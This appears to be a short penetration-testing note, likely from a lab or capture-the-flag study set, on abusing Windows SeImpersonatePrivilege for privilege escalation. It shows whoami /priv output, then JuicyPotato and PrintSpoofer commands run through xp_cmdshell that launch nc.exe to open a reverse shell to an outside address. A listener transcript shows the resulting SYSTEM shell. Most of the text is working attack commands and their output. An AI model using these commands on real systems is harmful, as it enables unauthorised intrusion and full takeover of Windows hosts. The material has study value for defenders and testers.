This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.

Check `whoami /priv`:

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State    

============================= ========================================= ======== 

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

With the `SeImpersonatePrivilege` privilege enabled, it is possible to perform privilege escalation:

```bash
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.35 8443 -e cmd.exe" -t *
```

```bash
sudo nc -lvp 8443
Listening on 0.0.0.0 8443
Connection received on 10.129.224.155 49736
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami 
nt authority\system
```

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.

Newer version of Windows, `PrintSpoofer/RougePotato/GodPotato` should work:

```bash
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.35 8443 -e cmd"
```
